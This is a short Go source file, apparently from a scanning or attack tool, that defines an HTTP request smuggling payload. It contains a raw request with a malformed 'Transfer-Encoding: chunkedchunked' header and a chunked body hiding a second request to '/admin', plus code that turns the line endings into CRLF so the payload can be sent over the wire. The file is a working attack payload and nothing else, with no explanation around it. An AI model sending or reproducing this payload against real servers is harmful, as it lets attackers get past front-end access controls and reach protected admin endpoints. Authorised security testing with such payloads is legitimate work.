package Smuggling

import "strings"

var TE_Payload = []string{`GET / HTTP/1.1
Host: %s
Transfer-Encoding: chunkedchunked

26
GET / HTTP/1.1
Content-Length: 30


0


GET /admin HTTP/1.1

`}

func init() {
	for n, x := range TE_Payload {
		x = strings.ReplaceAll(x, "\n", "\r\n")
		TE_Payload[n] = x
	}
}
